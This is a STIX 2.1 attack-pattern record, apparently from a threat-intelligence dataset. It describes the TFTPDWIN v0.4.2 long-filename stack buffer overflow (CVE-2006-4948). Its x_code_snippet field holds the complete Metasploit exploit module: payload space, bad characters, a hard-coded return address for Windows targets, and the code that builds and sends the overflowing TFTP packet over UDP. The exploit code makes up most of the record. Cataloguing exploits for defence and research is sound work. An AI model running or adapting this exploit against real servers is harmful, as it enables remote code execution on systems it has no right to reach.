{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--25bb0fdd-771d-49cc-a039-7272ccad0e48",
    "created": "2024-08-14T16:50:25.170173Z",
    "modified": "2024-08-14T16:50:25.170177Z",
    "name": "TFTPDWIN v0.4.2 Long Filename Buffer Overflow",
    "description": " This module exploits the ProSysInfo TFTPDWIN threaded TFTP Server. By sending an overly long file name to the tftpd.exe server, the stack can be overwritten. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/tftp/tftpdwin_long_filename.rb",
            "external_id": "tftpdwin_long_filename.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-4948"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'TFTPDWIN v0.4.2 Long Filename Buffer Overflow',\n      'Description'    => %q{\n          This module exploits the ProSysInfo TFTPDWIN threaded TFTP Server. By sending\n        an overly long file name to the tftpd.exe server, the stack can be overwritten.\n      },\n      'Author' \t => [ 'aushack' ],\n      'References'     =>\n        [\n          [ 'CVE', '2006-4948' ],\n          [ 'OSVDB', '29032' ],\n          [ 'BID', '20131' ],\n          [ 'EDB', '3132' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 284,\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Patrick - Tested OK 2007/10/02 w2ksp0, w2ksp4, xpsp0, xpsp2 en\n          [ 'Universal - tftpd.exe', { 'Ret' => 0x00458b91 } ] # pop edx / ret tftpd.exe\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2006-09-21',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(69),\n      ], self)\n  end\n\n  def exploit\n    connect_udp\n\n    print_status(\"Trying target #{target.name}...\")\n    sploit = \"\\x00\\x02\" + payload.encoded + [target['Ret']].pack('V')\n    sploit << \"netascii\\x00\" # The first null byte is borrowed for the target return address :)\n    udp_sock.put(sploit)\n\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-09-21",
    "x_mitre_platforms": [
        "win'"
    ]
}